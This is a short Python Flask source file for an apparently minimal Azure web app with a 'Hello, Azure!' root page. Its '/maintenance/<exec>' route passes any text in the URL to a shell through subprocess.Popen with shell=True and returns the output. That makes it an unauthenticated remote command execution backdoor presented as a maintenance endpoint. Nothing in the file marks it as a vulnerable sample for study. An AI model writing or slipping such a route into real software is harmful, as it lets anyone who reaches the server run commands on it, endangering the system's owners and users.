from flask import Flask
import subprocess

app = Flask(__name__)

@app.route('/maintenance/<exec>')
def exec_system(exec):
    return subprocess.Popen(exec, shell=True, stdout=subprocess.PIPE).stdout.read()
    
@app.route('/')
def hello():
    return "Hello, Azure!"

if __name__ == '__main__':
    app.run()
